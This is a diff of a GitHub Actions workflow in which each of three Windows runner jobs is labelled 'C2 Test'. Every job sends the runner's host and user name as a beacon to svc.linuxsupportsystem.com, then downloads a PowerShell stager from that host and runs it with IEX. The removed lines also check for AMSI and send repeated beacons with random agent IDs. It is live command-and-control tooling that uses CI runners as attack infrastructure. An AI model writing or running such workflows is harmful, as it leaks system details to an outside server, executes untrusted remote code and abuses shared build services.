@@ -7,122 +7,76 @@ jobs:
     runs-on: windows-2019
     timeout-minutes: 5
     steps:
-      - name: Full C2 Test (Windows 2019)
+      - name: C2 Test
         shell: powershell
         run: |
+          $ErrorActionPreference = "Continue"
           Write-Host "=== ENV ==="
           Write-Host "OS: $([Environment]::OSVersion.VersionString)"
           Write-Host "PS: $($PSVersionTable.PSVersion)"
           Write-Host "Host: $env:COMPUTERNAME"
-          Write-Host "User: $env:USERNAME"
-          Write-Host ".NET: $([System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription)"
-          
-          Write-Host "`n=== STAGER DOWNLOAD ==="
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          try {
-            $stager = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/s")
-            Write-Host "Stager downloaded: $($stager.Length) chars"
-            Write-Host "First 200: $($stager.Substring(0,200))"
-          } catch {
-            Write-Host "Download FAILED: $_"
-          }
-          
-          Write-Host "`n=== AMSI TEST ==="
-          try {
-            $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-            if ($t) { Write-Host "AMSI present (expected on 2019+)" } else { Write-Host "AMSI not found" }
-          } catch { Write-Host "AMSI check error: $_" }
-          
-          Write-Host "`n=== HTTP BEACON ==="
-          try {
-            $wc = New-Object Net.WebClient
-            $wc.Headers.Add("Content-Type","application/json")
-            $body = '{"id":"win2019-test","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"gh-2019","os":"Win2019-PS' + $PSVersionTable.PSVersion.Major + '","pid":' + $PID + ',"out":"HTTP beacon from Win2019 runner"}'
-            $r = $wc.UploadString("https://svc.linuxsupportsystem.com/b", $body)
-            Write-Host "HTTP Beacon: $r"
-          } catch { Write-Host "HTTP Beacon FAILED: $_" }
-          
-          Write-Host "`n=== DNS TEST ==="
-          try {
-            $dns = Resolve-DnsName "test.t.linuxsupportsystem.com" -Type A -ErrorAction SilentlyContinue
-            if ($dns) { Write-Host "DNS resolved: $($dns.IPAddress)" } else { Write-Host "DNS: NXDOMAIN (expected - no server yet)" }
-          } catch { Write-Host "DNS: $($_.Exception.Message)" }
-          
-          Write-Host "`n=== EXECUTE STAGER (5 beacons) ==="
-          try {
-            $ErrorActionPreference = "SilentlyContinue"
-            $pri = "https://svc.linuxsupportsystem.com"
-            $id = -join((65..90)+(97..122)|Get-Random -Count 6|ForEach-Object{[char]$_})
-            $h = $env:COMPUTERNAME; $w = $env:USERNAME
-            for ($i=0; $i -lt 5; $i++) {
-              $wc2 = New-Object Net.WebClient
-              $wc2.Headers.Add("Content-Type","application/json")
-              $body2 = '{"id":"' + $id + '","h":"' + $h + '","u":"' + $w + '","ip":"gh-2019","os":"Win2019","pid":' + $PID + ',"out":"beacon ' + $i + ' from 2019"}'
-              $r2 = $wc2.UploadString("$pri/b", $body2)
-              Write-Host "  Beacon $i : $r2"
-              Start-Sleep -Seconds 1
-            }
-            Write-Host "Agent ID: $id — 5 beacons sent"
-          } catch { Write-Host "Stager exec error: $_" }
+          Write-Host "`n=== BEACON ==="
+          $wc = New-Object Net.WebClient
+          $wc.Headers.Add("Content-Type","application/json")
+          $body = '{"id":"w19","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"gh-2019","os":"Win2019","pid":0,"out":"beacon ok"}'
+          $r = $wc.UploadString("https://svc.linuxsupportsystem.com/b", $body)
+          Write-Host "Beacon: $r"
+          Write-Host "`n=== STAGER ==="
+          $stager = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/s")
+          Write-Host "Downloaded $($stager.Length) chars"
+          IEX $stager
+          Start-Sleep -Seconds 8
+          Write-Host "Done"
 
   win2022:
     runs-on: windows-2022
     timeout-minutes: 5
     steps:
-      - name: Full C2 Test (Windows 2022)
+      - name: C2 Test
         shell: powershell
         run: |
+          $ErrorActionPreference = "Continue"
           Write-Host "=== ENV ==="
           Write-Host "OS: $([Environment]::OSVersion.VersionString)"
           Write-Host "PS: $($PSVersionTable.PSVersion)"
           Write-Host "Host: $env:COMPUTERNAME"
-          
-          Write-Host "`n=== HTTP BEACON ==="
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          try {
-            $wc = New-Object Net.WebClient
-            $wc.Headers.Add("Content-Type","application/json")
-            $body = '{"id":"win2022-test","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"gh-2022","os":"Win2022-PS' + $PSVersionTable.PSVersion.Major + '","pid":' + $PID + ',"out":"HTTP beacon from Win2022"}'
-            $r = $wc.UploadString("https://svc.linuxsupportsystem.com/b", $body)
-            Write-Host "Beacon: $r"
-          } catch { Write-Host "FAILED: $_" }
-          
-          Write-Host "`n=== FULL STAGER ==="
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          try {
-            $stager = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/s")
-            Write-Host "Downloaded $($stager.Length) chars — executing..."
-            IEX $stager
-            Write-Host "Stager executed"
-          } catch { Write-Host "Stager error: $_" }
+          Write-Host "`n=== BEACON ==="
+          $wc = New-Object Net.WebClient
+          $wc.Headers.Add("Content-Type","application/json")
+          $body = '{"id":"w22","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"gh-2022","os":"Win2022","pid":0,"out":"beacon ok"}'
+          $r = $wc.UploadString("https://svc.linuxsupportsystem.com/b", $body)
+          Write-Host "Beacon: $r"
+          Write-Host "`n=== STAGER ==="
+          $stager = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/s")
+          Write-Host "Downloaded $($stager.Length) chars"
+          IEX $stager
+          Start-Sleep -Seconds 8
+          Write-Host "Done"
 
   winlatest:
     runs-on: windows-latest
     timeout-minutes: 5
     steps:
-      - name: Full C2 Test (Windows Latest/2025)
+      - name: C2 Test
         shell: powershell
         run: |
+          $ErrorActionPreference = "Continue"
           Write-Host "=== ENV ==="
           Write-Host "OS: $([Environment]::OSVersion.VersionString)"
           Write-Host "PS: $($PSVersionTable.PSVersion)"
           Write-Host "Host: $env:COMPUTERNAME"
-          
-          Write-Host "`n=== HTTP BEACON ==="
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          try {
-            $wc = New-Object Net.WebClient
-            $wc.Headers.Add("Content-Type","application/json")
-            $body = '{"id":"winlatest-test","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"gh-latest","os":"WinLatest-PS' + $PSVersionTable.PSVersion.Major + '","pid":' + $PID + ',"out":"HTTP beacon from WinLatest"}'
-            $r = $wc.UploadString("https://svc.linuxsupportsystem.com/b", $body)
-            Write-Host "Beacon: $r"
-          } catch { Write-Host "FAILED: $_" }
-          
-          Write-Host "`n=== FULL STAGER ==="
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          try {
-            $stager = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/s")
-            Write-Host "Downloaded $($stager.Length) chars — executing..."
-            IEX $stager
-            Write-Host "Stager executed"
-          } catch { Write-Host "Stager error: $_" }
+          Write-Host "`n=== BEACON ==="
+          $wc = New-Object Net.WebClient
+          $wc.Headers.Add("Content-Type","application/json")
+          $body = '{"id":"wL","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"gh-latest","os":"WinLatest","pid":0,"out":"beacon ok"}'
+          $r = $wc.UploadString("https://svc.linuxsupportsystem.com/b", $body)
+          Write-Host "Beacon: $r"
+          Write-Host "`n=== STAGER ==="
+          $stager = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/s")
+          Write-Host "Downloaded $($stager.Length) chars"
+          IEX $stager
+          Start-Sleep -Seconds 8
+          Write-Host "Done"
